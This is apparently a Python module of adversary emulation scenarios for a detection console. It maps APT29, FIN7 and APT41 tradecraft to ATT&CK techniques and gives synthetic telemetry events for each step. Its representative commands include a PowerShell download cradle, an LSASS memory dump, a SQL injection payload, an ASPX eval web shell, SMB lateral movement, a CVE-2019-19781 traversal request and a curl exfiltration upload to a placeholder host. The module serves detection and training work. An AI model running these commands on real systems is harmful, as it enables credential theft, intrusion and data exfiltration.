"""ATT&CK-mapped adversary scenarios.

The scenario runner does not invent attacks: every step is a concrete
execution pulled from documented group behavior (MITRE ATT&CK Groups objects
carry per-technique procedure examples) plus representative command snippets
in the style of Atomic Red Team tests.

Each step declares:
    tactic / technique / name   ATT&CK mapping (display + rule join key)
    group                       provenance (APT29, FIN7, APT41)
    procedure                   what the group actually did (documented)
    command                     representative command snippet
    target_type                 component type the step lands on
    emits                       ground-truth events tagged with data sources

The `ev()` helper keeps emit declarations compact.
"""
from __future__ import annotations


def ev(ds: str, process: str | None = None, cmd: str | None = None,
       at: float | None = None, **details) -> dict:
    """One ground-truth event: ATT&CK data source + fields the console renders."""
    return {"ds": ds, "process": process, "cmd": cmd, "at": at, "details": details}


SCENARIOS: list[dict] = [
    # =====================================================================
    {
        "id": "apt29-credential-theft",
        "name": "APT29 — Phishing to Credential Theft",
        "group": "APT29",
        "blurb": ("Documented APT29 tradecraft: COVID-19-themed spearphishing with an "
                  "HTML dropper (EnvyScout), PowerShell staging, HTTPS C2, then LSASS "
                  "memory dumping via comsvcs.dll and lateral movement over SMB."),
        "steps": [
            {
                "tactic": "initial-access", "technique": "T1566.001",
                "name": "Spearphishing Attachment",
                "procedure": ("APT29 sent COVID-19-themed spearphishing emails carrying an "
                              "HTML attachment (EnvyScout) that imitated a legitimate "
                              "document viewer."),
                "command": "N/A — delivered as an email attachment (EnvyScout.html)",
                "cmd_source": "ATT&CK Groups procedure",
                "target_type": "workstation",
                "emits": [
                    ev("Email Delivery", at=0.1,
                       **{"from": "hr-updates@payroll-portal[.]net", "subject": "Q4 payroll adjustments",
                          "attachment": "EnvyScout.html", "verdict": "delivered to inbox"}),
                ],
            },
            {
                "tactic": "execution", "technique": "T1204.002",
                "name": "User Execution: Malicious File",
                "procedure": ("The HTML dropper wrote a malicious disk image; the user who "
                              "opened it executed a Cobalt Strike loader via rundll32."),
                "command": "rundll32.exe shell32.dll,ShellExec_RunDLL C:\\Users\\public\\payroll.dll",
                "cmd_source": "Atomic Red Team style (representative)",
                "target_type": "workstation",
                "emits": [
                    ev("Process Creation", at=0.2,
                       process="explorer.exe → payroll.img (mounted)",
                       cmd="double-click payroll.img (user execution)", **{"user": "j.smith"}),
                    ev("File Creation", at=0.35,
                       process="explorer.exe → rundll32.exe",
                       cmd="write C:\\Users\\public\\payroll.dll (784 KB)"),
                    ev("Process Creation", at=0.5,
                       process="explorer.exe → rundll32.exe",
                       cmd="rundll32.exe shell32.dll,ShellExec_RunDLL C:\\Users\\public\\payroll.dll"),
                ],
            },
            {
                "tactic": "execution", "technique": "T1059.001",
                "name": "PowerShell Download Cradle",
                "procedure": "APT29 used PowerShell download cradles to pull and run tooling in memory.",
                "command": ("powershell.exe -nop -w hidden -c \"IEX (New-Object "
                            "Net.WebClient).DownloadString('https://cdn-updates[.]net/a')\""),
                "cmd_source": "Atomic Red Team T1059.001",
                "target_type": "workstation",
                "emits": [
                    ev("Process Creation", at=0.2,
                       process="rundll32.exe → powershell.exe",
                       cmd="powershell.exe -nop -w hidden -c IEX(...)"),
                    ev("Command Execution", at=0.3,
                       process="rundll32.exe → powershell.exe",
                       cmd="IEX (New-Object Net.WebClient).DownloadString('https://cdn-updates[.]net/a')"),
                    ev("Network Connection Creation", at=0.4,
                       process="rundll32.exe → powershell.exe",
                       **{"dst": "203.0.113.66:443", "sni": "cdn-updates[.]net", "bytes_out": "4 KB"}),
                ],
            },
            {
                "tactic": "command-and-control", "technique": "T1071.001",
                "name": "Web Protocols C2 Beacon",
                "procedure": ("The Cobalt Strike beacon blended into HTTPS toward compromised "
                              "infrastructure, checking in on a ~60 s sleep."),
                "command": "N/A — beacon traffic (HTTPS, ~60s sleep, jittered)",
                "cmd_source": "ATT&CK Groups procedure",
                "target_type": "workstation",
                "window": 180,
                "emits": [
                    ev("Network Connection Creation", at=0.15, process="rundll32.exe",
                       **{"dst": "203.0.113.66:443", "sni": "cdn-updates[.]net", "bytes_out": "38 KB",
                          "interval": "~60s"}),
                    ev("Network Connection Creation", at=0.5, process="rundll32.exe",
                       **{"dst": "203.0.113.66:443", "sni": "cdn-updates[.]net", "bytes_out": "41 KB",
                          "interval": "~60s"}),
                    ev("Network Connection Creation", at=0.85, process="rundll32.exe",
                       **{"dst": "203.0.113.66:443", "sni": "cdn-updates[.]net", "bytes_out": "36 KB",
                          "interval": "~60s"}),
                ],
            },
            {
                "tactic": "credential-access", "technique": "T1003.001",
                "name": "LSASS Memory Dump via comsvcs.dll",
                "procedure": "APT29 invoked comsvcs.dll MiniDump via rundll32 to snapshot LSASS and harvest credentials.",
                "command": ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump "
                            "<lsass_pid> C:\\Windows\\Temp\\debug.bin full"),
                "cmd_source": "ATT&CK Groups procedure / Atomic Red Team T1003.001",
                "target_type": "workstation",
                "emits": [
                    ev("Process Access", at=0.3,
                       process="rundll32.exe → lsass.exe",
                       cmd="OpenProcess lsass.exe, rights 0x1010", **{"granted": "ReadVM"}),
                    ev("File Creation", at=0.5,
                       process="rundll32.exe",
                       cmd="write C:\\Windows\\Temp\\debug.bin (94 MB)"),
                ],
            },
            {
                "tactic": "lateral-movement", "technique": "T1021.002",
                "name": "SMB / Windows Admin Shares",
                "procedure": ("With stolen credentials APT29 staged tools on internal shares and "
                              "triggered remote service execution over SMB."),
                "command": ("net use \\\\FILE-01\\ADMIN$ /user:CORP\\j.smith && "
                            "copy payload.dll \\\\FILE-01\\ADMIN$\\ && sc create updsrv binpath= ..."),
                "cmd_source": "Atomic Red Team style (representative)",
                "target_type": "server_win",
                "emits": [
                    ev("Logon Session Creation", at=0.2,
                       process="",
                       **{"event": "4624", "logon_type": "3 (network)", "user": "CORP\\j.smith",
                          "src_ws": "WS-001", "auth": "NTLM"}),
                    ev("Network Connection Creation", at=0.3,
                       **{"src": "10.0.20.11:49771", "dst": "10.0.20.30:445", "proto": "SMB2"}),
                    ev("Process Creation", at=0.6,
                       process="services.exe → PSEXESVC.exe → cmd.exe",
                       cmd="cmd.exe /c payload.dll install", **{"host_role": "target"}),
                ],
            },
        ],
    },
    # =====================================================================
    {
        "id": "fin7-payment-card-harvest",
        "name": "FIN7 — Payment Card Harvest",
        "group": "FIN7",
        "blurb": ("Documented FIN7 tradecraft: exploit a public-facing payment application, "
                  "drop a web shell, run discovery from cmd, masquerade payloads, scrape card "
                  "data and exfiltrate over the C2 channel."),
        "steps": [
            {
                "tactic": "initial-access", "technique": "T1190",
                "name": "Exploit Public-Facing Application",
                "procedure": "FIN7 exploited SQL injection in public-facing payment applications to reach the underlying host.",
                "command": "POST /checkout?id=1' UNION SELECT card_number,1 FROM payments--",
                "cmd_source": "ATT&CK Groups procedure (representative payload)",
                "target_type": "web_server",
                "emits": [
                    ev("Network Traffic Content", at=0.2,
                       **{"method": "POST", "path": "/checkout", "status": 200,
                          "payload": "id=1' UNION SELECT card_number,1 FROM payments--"}),
                    ev("Process Creation", at=0.4,
                       process="w3wp.exe → cmd.exe",
                       cmd="cmd.exe /c whoami"),
                ],
            },
            {
                "tactic": "persistence", "technique": "T1505.003",
                "name": "Web Shell (POWERPLANT-style)",
                "procedure": "A web shell dropped into the webroot gave FIN7 persistent HTTP access.",
                "command": "echo ^<^%@ Page Language=\"C#\" %^>^<^% eval(Request[\"c\"]) %^> > C:\\inetpub\\wwwroot\\cart.aspx",
                "cmd_source": "ATT&CK Groups procedure (representative)",
                "target_type": "web_server",
                "emits": [
                    ev("File Creation", at=0.3,
                       process="w3wp.exe → cmd.exe",
                       cmd="write C:\\inetpub\\wwwroot\\cart.aspx (2 KB)"),
                    ev("Process Creation", at=0.6,
                       process="w3wp.exe → cmd.exe",
                       cmd="cmd.exe /c cart.aspx?c=Server.MapPath('.')"),
                ],
            },
            {
                "tactic": "execution", "technique": "T1059.003",
                "name": "Windows Command Shell Discovery",
                "procedure": "Through the shell FIN7 ran host and domain discovery.",
                "command": "cmd.exe /c whoami && net user /domain && systeminfo",
                "cmd_source": "ATT&CK Groups procedure",
                "target_type": "web_server",
                "emits": [
                    ev("Process Creation", at=0.25,
                       process="cmd.exe → net.exe", cmd="net.exe user /domain"),
                    ev("Command Execution", at=0.45,
                       process="cmd.exe", cmd="systeminfo"),
                    ev("Process Creation", at=0.6,
                       process="cmd.exe → systeminfo.exe", cmd="systeminfo"),
                ],
            },
            {
                "tactic": "defense-evasion", "technique": "T1036",
                "name": "Masquerading as System Binary",
                "procedure": "Payloads were renamed to blend in — svchost.exe living outside System32.",
                "command": "copy tool.exe C:\\Windows\\Temp\\svchost.exe && C:\\Windows\\Temp\\svchost.exe -c start",
                "cmd_source": "ATT&CK Groups procedure",
                "target_type": "web_server",
                "emits": [
                    ev("File Creation", at=0.3,
                       process="cmd.exe", cmd="copy tool.exe C:\\Windows\\Temp\\svchost.exe"),
                    ev("Process Creation", at=0.55,
                       process="cmd.exe → svchost.exe (C:\\Windows\\Temp)",
                       cmd="C:\\Windows\\Temp\\svchost.exe -c start"),
                ],
            },
            {
                "tactic": "collection", "technique": "T1005",
                "name": "Data from Local System (card scrape)",
                "procedure": ("Custom memory scrapers (PLINKETT-family tooling) harvested payment "
                              "card data from the payment environment."),
                "command": "scraper.exe --pool w3wp --out poscache.dat",
                "cmd_source": "ATT&CK Groups procedure (representative)",
                "target_type": "web_server",
                "emits": [
                    ev("Process Creation", at=0.2,
                       process="cmd.exe → scraper.exe", cmd="scraper.exe --pool w3wp --out poscache.dat"),
                    ev("File Access", at=0.5,
                       process="scraper.exe",
                       cmd="read C:\\inetpub\\logs\\*.log, read poscache.dat (1.2 GB cumulative)"),
                ],
            },
            {
                "tactic": "exfiltration", "technique": "T1041",
                "name": "Exfiltration Over C2 Channel",
                "procedure": "Collected card data was staged and pushed out over the existing C2 channel.",
                "command": "N/A — bulk upload over established C2 (HTTPS)",
                "cmd_source": "ATT&CK Groups procedure",
                "target_type": "web_server",
                "window": 150,
                "emits": [
                    ev("Network Connection Creation", at=0.3,
                       **{"src": "10.0.10.20:49330", "dst": "45.33.22.10:443", "bytes_out": "612 MB",
                          "duration": "9m40s"}),
                    ev("Network Connection Creation", at=0.8,
                       **{"src": "10.0.10.20:49441", "dst": "45.33.22.10:443", "bytes_out": "188 MB",
                          "duration": "3m05s"}),
                ],
            },
        ],
    },
    # =====================================================================
    {
        "id": "apt41-cloud-compromise",
        "name": "APT41 — Edge Appliance to Cloud Storage",
        "group": "APT41",
        "blurb": ("Documented APT41 tradecraft: exploit an internet-facing appliance "
                  "(e.g. Citrix NetScaler CVE-2019-19781), sign into cloud with stolen "
                  "credentials, enumerate infrastructure, pull data from cloud storage "
                  "and stage it with a file-sharing service."),
        "steps": [
            {
                "tactic": "initial-access", "technique": "T1190",
                "name": "Exploit Edge Appliance",
                "procedure": ("APT41 exploited internet-facing appliances, including Citrix "
                              "NetScaler ADC/Gateway (CVE-2019-19781)."),
                "command": "GET /vpn/../vpns/cfg/smb.conf HTTP/1.1  (path traversal, CVE-2019-19781)",
                "cmd_source": "ATT&CK Groups procedure",
                "target_type": "idp",
                "emits": [
                    ev("Network Traffic Content", at=0.2,
                       **{"method": "GET", "path": "/vpn/../vpns/cfg/smb.conf", "status": 200,
                          "payload": "CVE-2019-19781 path traversal"}),
                    ev("Network Connection Creation", at=0.4,
                       **{"src": "198.51.100.7:51022", "dst": "203.0.113.10:443", "proto": "TLS"}),
                ],
            },
            {
                "tactic": "defense-evasion", "technique": "T1078.004",
                "name": "Valid Accounts: Cloud Console",
                "procedure": "Harvested credentials were used to sign into cloud consoles as legitimate users.",
                "command": "N/A — console sign-in from new ASN + new device",
                "cmd_source": "ATT&CK Groups procedure",
                "target_type": "iam",
                "emits": [
                    ev("Cloud Logon", at=0.3,
                       **{"event": "ConsoleLogin", "user": "cloud-admin", "mfa": "no",
                          "geo": "new (HK)", "device": "unrecognized", "result": "success"}),
                ],
            },
            {
                "tactic": "discovery", "technique": "T1580",
                "name": "Cloud Infrastructure Discovery",
                "procedure": "The intruder enumerated cloud infrastructure with native APIs.",
                "command": "aws ec2 describe-instances --region all; aws s3 ls",
                "cmd_source": "Atomic Red Team style (representative)",
                "target_type": "iam",
                "emits": [
                    ev("Cloud API Call", at=0.3,
                       **{"api": "ec2:DescribeInstances", "count": 47, "src_ip": "198.51.100.7"}),
                    ev("Cloud API Call", at=0.55,
                       **{"api": "s3:ListBuckets", "count": 40, "src_ip": "198.51.100.7"}),
                ],
            },
            {
                "tactic": "collection", "technique": "T1530",
                "name": "Data from Cloud Storage",
                "procedure": "Data was pulled directly from cloud storage using compromised roles.",
                "command": "aws s3 cp s3://customer-backups/exports.tar.gz .",
                "cmd_source": "ATT&CK Groups procedure",
                "target_type": "s3",
                "emits": [
                    ev("Cloud Storage Access", at=0.4,
                       **{"api": "GetObject", "bucket": "customer-backups",
                          "key": "exports.tar.gz", "bytes": "4.2 GB",
                          "principal": "cloud-admin", "src_ip": "198.51.100.7"}),
                ],
            },
            {
                "tactic": "exfiltration", "technique": "T1567.002",
                "name": "Exfiltration to File-Sharing Service",
                "procedure": "APT41 staged stolen data with external file-sharing / cloud storage services for retrieval.",
                "command": "curl -T exports.tar.gz https://fileshare-api[.]example/upload",
                "cmd_source": "ATT&CK Groups procedure (representative)",
                "target_type": "iam",
                "emits": [
                    ev("Cloud Storage Access", at=0.4,
                       **{"api": "PutObject (external)", "bucket": "fileshare-api[.]example",
                          "bytes": "4.2 GB"}),
                    ev("Network Connection Creation", at=0.55,
                       **{"src": "10.0.30.10:39812", "dst": "162.159.140.229:443",
                          "bytes_out": "4.2 GB", "duration": "14m"}),
                ],
            },
        ],
    },
]

SCENARIOS_BY_ID = {s["id"]: s for s in SCENARIOS}
